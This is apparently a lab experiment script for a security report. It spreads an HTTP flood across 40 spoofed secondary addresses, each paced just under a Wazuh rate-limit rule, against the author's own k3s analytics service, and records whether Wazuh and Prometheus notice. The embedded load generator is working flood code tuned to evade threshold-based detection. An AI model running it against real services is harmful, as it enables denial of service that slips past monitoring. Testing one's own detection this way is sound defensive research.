#!/usr/bin/env bash
# Experiment for the report (TODO: distributed flood). Not part of the platform.
# Many sources, each BELOW Wazuh rule 100210's threshold (15 requests / 10 s), flood the dc1
# analytics NodePort. Question: does Wazuh detect it (expected: no) and does Prometheus see it?
#   N_PER_BOX secondary addresses are added to attacker1 and attacker2 (removed at the end);
#   each address sends RATE req/s for SECS seconds; the legitimate client measures latency.
# Run on the Incus host from the repo root:  report/experiments/distributed-flood.sh
set -u
PLATFORM=k3s
source "$(dirname "$0")/../../test-lib.sh"
cd "$(dirname "$0")/../.." || exit 1
OUT=evidence/k3s/distributed-flood; mkdir -p "$OUT"
exec > >(tee "$OUT/run.log") 2>&1
N_PER_BOX=${N_PER_BOX:-20}; RATE=${RATE:-1.0}; SECS=${SECS:-40}
BOXES="attacker1 attacker2"
URL="$(public_url analytics)/stats?limit=1000"
echo "Run started $(date -Is): $N_PER_BOX sources per box x 2 boxes, $RATE req/s each, $SECS s, target $URL"

# free addresses at the top of the lab /24 (skip any already in use)
NET=$(ip_of attacker1 | cut -d. -f1-3)
used=$(incus list -c4 --format csv | grep -oE '[0-9]+(\.[0-9]+){3}' | sort -u)
cand=(); for h in $(seq 250 -1 150); do a="$NET.$h"; echo "$used" | grep -qx "$a" || cand+=("$a"); done
declare -A ADDRS; i=0
for b in $BOXES; do
  ADDRS[$b]="${cand[*]:$i:$N_PER_BOX}"; i=$((i + N_PER_BOX))
  for a in ${ADDRS[$b]}; do incus exec "$b" -- ip addr add "$a/24" dev eth0 2>/dev/null; done
done
cleanup() { for b in $BOXES; do for a in ${ADDRS[$b]}; do incus exec "$b" -- ip addr del "$a/24" dev eth0 2>/dev/null; done; done; }
trap cleanup EXIT

LOADGEN='
import http.client, sys, threading, time, urllib.parse
url, rate, secs = sys.argv[1], float(sys.argv[2]), float(sys.argv[3]); srcs = sys.argv[4:]
u = urllib.parse.urlsplit(url); ok = [0]; bad = [0]; lock = threading.Lock()
def run(src):
    end = time.time() + secs; nxt = time.time()
    while time.time() < end:
        try:
            c = http.client.HTTPConnection(u.hostname, u.port, timeout=5, source_address=(src, 0))
            c.request("GET", u.path + "?" + u.query); r = c.getresponse(); r.read(); c.close()
            with lock: ok[0] += 1
        except Exception:
            with lock: bad[0] += 1
        nxt = max(nxt + 1.0 / rate, time.time())   # never catch up in bursts: a burst would cross the threshold
        time.sleep(max(0, nxt - time.time()))
ts = [threading.Thread(target=run, args=(s,)) for s in srcs]
[t.start() for t in ts]; [t.join() for t in ts]
print("RESULT sources=%d ok=%d failed=%d" % (len(srcs), ok[0], bad[0]))
'
LEGIT=${LEGIT:-legit-client}
ensure_client "$LEGIT"
incus file push ddos-poc.py "$LEGIT/root/ddos-poc.py" >/dev/null

section "1. Baseline (legitimate client alone, 15 s)"
incus exec "$LEGIT" -- python3 /root/ddos-poc.py --url "$URL" --duration 15 --workers 1 --delay 1 --label baseline | tee "$OUT/1-legit-baseline.txt"

section "2. Distributed flood"
MARK=$(alerts_mark)
for b in $BOXES; do
  incus exec "$b" -- python3 -c "$LOADGEN" "$URL" "$RATE" "$SECS" ${ADDRS[$b]} > "$OUT/2-attack-$b.txt" 2>&1 &
done
sleep 2
incus exec "$LEGIT" -- python3 /root/ddos-poc.py --url "$URL" --duration $((SECS - 10)) --workers 1 --delay 1 --label during | tee "$OUT/2-legit-during.txt"
prom_query 'sum by (job) (rate(http_requests_total{job="ssle-analytics"}[15s]))' | tee "$OUT/2-prom-rate.txt"
prom_alerts | tee "$OUT/2-prom-alerts.txt"
wait
cat "$OUT"/2-attack-*.txt
sleep 10

section "3. Did Wazuh notice?"
alerts_since "$MARK" 100210 > "$OUT/3-wazuh-100210.json"
n=$(wc -l < "$OUT/3-wazuh-100210.json")
echo "rule 100210 alerts during the distributed flood: $n"
firewall "$K3S_MASTER" > "$OUT/3-iptables.txt"
blocked_n=$(grep -c ' DROP ' "$OUT/3-iptables.txt")
echo "DROP rules on $K3S_MASTER: $blocked_n"
grep -qE 'SSLEHighRequestRate +firing' "$OUT/2-prom-alerts.txt" && echo "Prometheus SSLEHighRequestRate: firing" || echo "Prometheus SSLEHighRequestRate: not firing"

section "Summary"
{
  echo "  sources: $((2 * N_PER_BOX)) addresses, $RATE req/s each (rule 100210 threshold: 15 per 10 s = 1.5 req/s)"
  grep -h RESULT "$OUT"/2-attack-*.txt | sed 's/^/  attack /'
  echo "  legit baseline: $(grep RESULT "$OUT/1-legit-baseline.txt")"
  echo "  legit during  : $(grep RESULT "$OUT/2-legit-during.txt")"
  echo "  analytics request rate seen by Prometheus: $(grep -oE '\} [0-9.]+' "$OUT/2-prom-rate.txt" | head -1 | cut -c3-) req/s"
  echo "  Wazuh 100210 alerts: $n ; DROP rules: $blocked_n"
  grep -E 'SSLE[A-Za-z]+ +firing' "$OUT/2-prom-alerts.txt" | awk '{print "  prometheus firing: "$1" "$3}'
} | tee "$OUT/summary.txt"
